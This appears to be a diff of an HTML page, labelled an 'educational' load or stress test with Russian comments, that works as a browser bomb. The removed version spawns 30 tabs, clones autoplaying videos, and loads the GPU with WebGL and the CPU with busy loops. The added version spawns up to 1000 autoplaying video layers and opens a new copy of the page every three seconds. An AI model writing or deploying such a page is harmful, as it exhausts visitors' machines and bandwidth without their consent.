@@ -1,60 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Educational Load Test</title>
+    <title>Educational Stress Test</title>
     <style>
-        #gpu-canvas { position: fixed; top:0; left:0; width:100vw; height:100vh; }
+        body { overflow: hidden; margin: 0; }
+        .video-layer {
+            position: absolute;
+            width: 20vw;
+            height: 20vh;
+            opacity: 0.7;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <!-- Видео с принудительным декодированием -->
-    <video id="heavyVideo" autoplay loop muted controls width="100%">
-        <source src="ambatublow.mp4" type="video/mp4">
-    </video>
-
-    <!-- WebGL GPU Loader -->
-    <canvas id="gpu-canvas"></canvas>
-
     <script>
-        // 1. Открытие вкладок (сработает только без блокировщика)
-        for(let i = 0; i < 30; i++) {
-            setTimeout(() => window.open(location.href, `tab${i}`), i * 300);
-        }
-
-        // 2. Видео-бомбардировка
-        const video = document.getElementById('heavyVideo');
-        video.addEventListener('loadeddata', () => {
-            for(let i = 0; i < 10; i++) {
-                const clone = video.cloneNode(true);
-                document.body.appendChild(clone);
-            }
-        });
-
-        // 3. WebGL-нагрузка (шейдерный рендеринг)
-        const canvas = document.getElementById('gpu-canvas');
-        const gl = canvas.getContext('webgl');
-        const vertices = new Float32Array([...Array(1e6)].flatMap(() => [Math.random(), Math.random()]));
+        // Параметры нагрузки
+        const MAX_LAYERS = 1000; // Максимум видео-слоёв
+        const SPAWN_DELAY = 500; // Мс между созданиями
+        const VIDEO_SRC = "ambatublow.mp4"; // Замените на реальную ссылку
         
-        const buffer = gl.createBuffer();
-        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-        gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-        
-        const animate = () => {
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            gl.drawArrays(gl.POINTS, 0, vertices.length / 2);
-            requestAnimationFrame(animate);
+        // Рекурсивное создание видео-слоёв
+        let layerCount = 0;
+        const createVideoLayer = () => {
+            if (layerCount >= MAX_LAYERS) return;
+            
+            const layer = document.createElement('div');
+            layer.className = 'video-layer';
+            layer.style.left = Math.random() * 100 + 'vw';
+            layer.style.top = Math.random() * 100 + 'vh';
+            
+            const video = document.createElement('video');
+            video.src = VIDEO_SRC + '?cachebust=' + Date.now();
+            video.autoplay = true;
+            video.loop = true;
+            video.muted = true;
+            video.playsInline = true;
+            video.style.width = '100%';
+            video.style.height = '100%';
+            
+            layer.appendChild(video);
+            document.body.appendChild(layer);
+            
+            layerCount++;
+            setTimeout(createVideoLayer, SPAWN_DELAY);
         };
-        animate();
 
-        // 4. CPU-нагрузка
+        // Запуск процесса
+        createVideoLayer();
+        
+        // Дополнительная нагрузка
         setInterval(() => {
-            const start = Date.now();
-            while(Date.now() - start < 1000) {
-                // Имитация тяжёлых вычислений
-                const arr = new Array(1e6).fill().map(Math.random);
-                arr.sort((a,b) => a - b);
-            }
-        }, 5000);
+            window.open(window.location.href + '?tab=' + Date.now(), '_blank');
+        }, 3000);
     </script>
 </body>
 </html>
